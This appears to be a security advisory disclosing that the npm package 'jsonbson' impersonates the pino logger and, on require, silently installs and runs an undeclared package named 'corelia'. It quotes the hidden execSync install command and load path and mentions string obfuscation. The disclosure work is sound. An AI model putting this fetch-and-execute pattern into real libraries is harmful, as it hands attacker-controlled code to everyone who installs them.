summary: jsonbson fetches and executes undeclared npm package 'corelia' at require-time
details: jsonbson presents itself as the popular pino logger (main is pino.js, homepage is https://getpino.io, public API mirrors pino with module.exports.pino = pino, keywords/scripts mimic pino). When a consumer require()s the package, lib/writer.js runs at load time and attempts require('corelia'); on failure it invokes execSync('npm install corelia --no-warnings --no-save --no-progress --loglevel silent') and then require('../../corelia/pino.js'). The 'corelia' package is not declared anywhere in package.json's dependencies, so its contents are entirely controlled by whoever publishes that name on the npm registry and can be mutated at any time without any change to jsonbson itself. Every installer that loads jsonbson (directly or transitively) downloads and executes arbitrary attacker-controlled code in the consumer process. The same file uses String.fromCharCode concatenation to assemble strings, an obfuscation technique paired with the load-time fetch-and-exec. The combination of pino impersonation, undeclared remote package fetch+execute on import, and string obfuscation is an unambiguous supply-chain attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
